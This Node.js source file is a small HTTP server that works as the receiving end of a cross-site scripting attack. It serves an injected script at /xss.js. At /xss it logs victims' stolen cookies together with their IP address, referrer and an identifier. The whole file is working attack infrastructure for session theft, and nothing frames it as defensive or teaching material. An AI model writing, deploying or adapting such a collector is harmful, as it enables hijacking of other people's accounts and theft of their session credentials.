var http = require('http');
var fs = require('fs');
var url = require('url');
var querystring = require('querystring');

function formatDate(date, style){   
      var y = date.getFullYear();
      var M = "0" + (date.getMonth() + 1);
      M = M.substring(M.length - 2);
      var d = "0" + date.getDate();
      d = d.substring(d.length - 2);
      var h = "0" + date.getHours();
      h = h.substring(h.length - 2);
      var m = "0" + date.getMinutes();
      m = m.substring(m.length - 2);
      var s = "0" + date.getSeconds();
      s = s.substring(s.length - 2);
      return style.replace('yyyy', y).replace('MM', M).replace('dd', d).replace('hh', h).replace('mm', m).replace('ss', s);
};





function start(route) {
	function onRequest(request, response) {
	var pathname = request.url;
	pathname = url.parse(request.url).pathname;
	if(pathname === "/favicon.ico")
	{
		var file_ = fs.readFileSync("./ocr_pi.png" , "binary");
		response.writeHead(200,{'Content-Type': 'image/png'});
		response.write(file_,"binary");
		response.end();
		return;
	}
	else if(pathname === "/xss")
	{
		requrl = request.url;
		args = url.parse(request.url,true).query;
		console.log("\n|Cookie Get! "+formatDate(new Date,"yyyy-MM-dd hh:mm:ss")+"|");
		console.log("Source:	"+getClientIp(request));
		console.log("Refer:	"+requrl);
		console.log("ID:	"+args.id);
		console.log("Cookie:");
		console.log(args.cookie);
		console.log("|Get end.|\n")
	}
	else if(pathname === "/xss.js")
	{
		console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
		var file_ =  fs.readFileSync("./xss.js", "utf-8");
		response.writeHead(200, {'Content-Type': 'text/javascript'});
		response.write(file_, "utf-8");
		response.end();
		return;
	}
	else
	{	
		console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
	}

	function getClientIp(req) {
		return req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress;
    };


	response.writeHead(200,{'Content-Type': 'text/plain'});
	response.end("Hi! \n;D");

	
	}

	http.createServer(onRequest).listen(8080);
	console.log('Server running at http://127.0.0.1:8080/')
}

exports.start = start;
